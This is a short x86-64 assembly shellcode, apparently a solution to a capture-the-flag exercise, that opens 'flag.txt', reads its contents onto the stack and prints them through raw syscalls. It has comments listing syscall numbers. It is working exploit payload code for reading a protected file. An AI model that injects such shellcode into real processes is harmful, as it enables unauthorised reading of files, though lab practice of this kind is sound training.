.global _start
.intel_syntax noprefix

_start:#["read", "exit"]
       #["read:3","write:4", "open:5", "close:6"]

open:
    lea rdi, [rip+flag]
    mov rsi, 0
    mov rax, 2
    syscall
read:
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 60
    mov rax, 0
    syscall
write:
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall
exit:
    mov rdi, 0
    mov rax, 60
    syscall

flag:
    .string "flag.txt"

